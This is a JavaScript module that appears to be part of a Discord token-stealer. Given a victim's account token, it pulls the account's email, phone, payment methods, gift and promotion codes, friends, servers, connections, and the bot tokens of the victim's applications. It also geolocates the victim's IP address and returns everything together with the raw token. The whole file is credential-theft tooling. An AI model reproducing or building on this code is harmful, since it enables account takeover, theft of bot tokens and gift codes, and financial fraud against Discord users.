const fetch = require("sync-fetch");

function getBotToken(e) {
    var n, t;
    return "Invalid" == (t = getInfo("https://discord.com/api/v9/applications", e)) 
    ? "Token Isn't Valid" 
    : ((t = t.filter(e => e.bot)).forEach(e => n += `${e.bot.username}::${e.bot.id}::${e.bot.token}||`), n.slice(9, -2))
}
function calcDate(a, b) {
    return new Date(a.setMonth(a.getMonth() + b))
}
function guildList(e) {
    var n, 
    t = getInfo("https://discord.com/api/v9/users/@me/guilds", e);
    return "Invalid" == t 
    ? "Token Isn't Valid" 
    : (t.forEach(e => n += `${e.name}::${e.id}||`), 
    n.slice(9, -2))
}
function getGiforPng(url) {
    if (!url) return false
    var ft = fetch(url).headers.get("content-type")
    if (ft == "image/gif") return url + ".gif?size=512"
    else return url + ".png?size=512"
}
function friendList(e) {
    var n, t = getInfo("https://discordapp.com/api/v9/users/@me/relationships", e);
    return "Invalid" == t 
    ? "Token Isn't Valid" 
    : ((t = t.filter(e => 1 == e.type)).forEach(e => n += `${e.user.username}#${e.user.discriminator}::${e.id} || `), n.slice(9, -3))
}
function getGifts(e, s) {
    var retu = []
    var gifts = getInfo("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=" + s.locale, e)
    gifts?.forEach(r => {
        retu.push({
            name: r.promotion.outbound_title,
            code: r.code
        })
    })
    return retu
}
function getNitro(r) {
    switch(r.premium_type) {
        default:
            return ":x:"
        case 1:
            return "Nitro"
        case 2:
            if (!r.premium_guild_since) return "Nitro"
            var now = new Date(Date.now())
            var arr = [
                "Booster 1 Month",
                "Booster 2 Month",
                "Booster 6 Month",
                "Booster 9 Month",
                "Booster 12 Month",
                "Booster 15 Month",
                "Booster 18 Month",
                "Booster 24 Month"
            ]
            var a = [
                new Date(r.premium_guild_since),
                new Date(r.premium_guild_since),
                new Date(r.premium_guild_since),
                new Date(r.premium_guild_since), 
                new Date(r.premium_guild_since), 
                new Date(r.premium_guild_since), 
                new Date(r.premium_guild_since)
            ]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "Nitro " + arr[i]
    }
}
function friendB(e) {
    var n, t = e.filter(e => 1 == e.type);
    for (filter of t) {
        var i = friendBadges(filter.user.public_flags)
        ; "None" != i && (n += `${i} ${filter.user.username}#${filter.user.discriminator}\n`)
    }
    return n 
    || (n = "None"), 
    "None" == n 
    ? n 
    : n.slice(9)
}
function getIPInfo(e) {
    return fetch(`http://ip-api.com/json/${e}`).json()
}
function badges(e) {
    var n = ""
    ; return 1 == (1 & e) 
    && (n += "Staff Discord ")
    , 2 == (2 & e) && (n += "Partner Discord ")
    , 4 == (4 & e) && (n += "Events Discord ")
    , 8 == (8 & e) && (n += "Bug Hunter Level 1 ")
    , 16384 == (16384 & e) && (n += "Bug Hunter Level 2 ")
    , 64 == (64 & e) && (n += "Bravery ")
    , 128 == (128 & e) && (n += "Brilliance ")
    , 256 == (256 & e) && (n += "Balance ")
    , 512 == (512 & e) && (n += "Early ")
    , 4194304 == (4194304 & e) && (n += "Active Develper ")
    , 131072 == (131072 & e) && (n += "Discord Developer Verified ")
    , "" == n && (n = ":x:")
    , n
}
function friendBadges(e) {
    var n = ""
    ; return 1 == (1 & e) && (n += "Staff Discord ")
    , 2 == (2 & e) && (n += "Partner Discord ")
    , 4 == (4 & e) && (n += "Events Discord ")
    , 8 == (8 & e) && (n += "Bug Hunter Level 1 ")
    , 4194304 == (4194304 & e) && (n += "Active Develper ")
    , 512 == (512 & e) && (n += "Early ")
    , 16384 == (16384 & e) && (n += "Bug Hunter Level 2 ")
    , 131072 == (131072 & e) && (n += "Discord Developer Verified ")
    , "" == n && (n = "None")
    , n
}
function getInfo(e, n) {
    var t = fetch(e, {
        headers: {
            "Content-Type": "application/json",
            authorization: n
        }
    }).json();
    return 0 == t.code ? "Invalid" : t
}
function getMFACode(n, t) {
    return "Cannot Get MFA due to New Discord Protections."
}
function getAllInfos(e, n, t) {
    var i = {},
        o = "",
        r = getInfo("https://discord.com/api/v9/users/@me", e),
        j = getInfo("https://discord.com/api/v9/users/" + Buffer.from(e.split(".")[0], "base64").toString() + "/profile", e);
    if ("Invalid" == r) return "TOKEN ISN'T VALID";
    var s = getInfo("https://discord.com/api/v9/users/@me/settings", e),
        a = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", e),
        d = getInfo("https://discordapp.com/api/v9/users/@me/relationships", e),
        l = getInfo("https://discord.com/api/v9/users/@me/guilds", e),
        c = getInfo("https://discord.com/api/v9/applications", e),
        u = getInfo("https://discordapp.com/api/v9/users/@me/connections", e),
        f = getInfo("https://discord.com/api/v8/users/@me/entitlements/gifts", e);
    if (n) var p = getIPInfo(n);
    var h, g, m = 0,
        v = "";
    if (a?.forEach(e => { e.brand && 0 == e.invalid && (v += "Credit Card "), e.email && (v += "Paypal ")
        }), v || (v = "None"), g = r.bio ? r.bio : "No Biography", h = r.phone ? r.phone : "No Phone", r.banner) var I = getGiforPng(`https://cdn.discordapp.com/banners/${r.id}/${r.banner}`);
    else I = "No";
    if (r.nsfw_allowed) var b = "Yes";
    else b = "No";
    return f[0] ? f.forEach(e => o += `${e}, `) : o = "None", i = {
        username: `${r.username}#${r.discriminator}`,
        ID: r.id,
        badges: badges(r.flags),
        nitroType: getNitro(j),
        hasBanner: I,
        avatar: r.avatar ? getGiforPng(`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`) : "No",
        totalFriend: d.filter(e => 1 == e.type).length,
        totalBlocked: d.filter(e => 2 == e.type).length,
        pending: d.filter(e => 3 == e.type).length,
        billing: v,
        NitroGifts: o,
        Gifts: getGifts(e, s),
        totalGuild: l.length,
        totalOwnedGuild: l.filter(r => r.owner).length,
        totalApplication: c.length,
        totalConnection: u.length,
        NSFWAllowed: r.nsfw_allowed ? ":underage: `Allowed`" : ":underage: :x: `Not Allowed`",
        langue: {
            "fr": "🇫🇷 French",
            "da": "🇩🇰 Dansk",
            "de": "🇩🇪 Deutsch",
            "en-GB": "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English (UK)",
            "en-US": "🇺🇸 USA",
            "en-ES": "🇪🇸 Espagnol",
            "hr": "🇭🇷 Croatian",
            "it": "🇮🇹 Italianio",
            "lt": "🇱🇹 Lithuanian",
            "hu": "🇳🇴🇭🇺 Hungarian",
            "no": "🇳🇴 Norwegian",
            "pl": "🇵🇱 Polish",
            'pr-BR': "🇵🇹 Portuguese",
            "ro": "🇷🇴 Romanian",
            "fi": "🇫🇮 Finnish",
            "sv-SE": "🇸🇪 Swedish",
            "vi": "🇻🇳 Vietnamese",
            "tr": "🇹🇷 Turkish",
            "cs": "🇨🇿 Czech",
            "el": "🇬🇷 Greek",
            "bg": "🇧🇬 Bulgarian",
            "ru": "🇷🇺 Russian",
            "uk": "🇺🇦 Ukrainian",
            "hi": "🇮🇳 Indian",
            "th": "🇹🇼 Taiwanese",
            "zh-CN": "🇨🇳 Chinese-China",
            "ja": "🇯🇵 Japanese",
            "zh-TW": "🇨🇳 Chinese-Taiwanese",
            "ko": "🇰🇷 Korean"
        } [s.locale],
        status: {
            online: "Online",
            idle: "Idle",
            dnd: "Do Not Disturb",
            invisible: "Offline"
        } [s.status],
        theme: {
            dark: "Dark",
            light: "Light"
        } [s.theme],
        verified: r.verified,
        hasBio: g,
        mail: r.email,
        hasPhone: h,
        token: e,
        rareFriend: friendB(d)
    }, n && (i.ipInfos = {
        country: p.country,
        regionName: p.regionName,
        city: p.city,
        ISP: p.isp
    }), t && (i.mfaCode = getMFACode(e, t)), i
}
module.exports = {
    getAllInfos: getAllInfos,
    getBotToken: getBotToken,
    getGuildList: guildList,
    getFriendList: friendList
};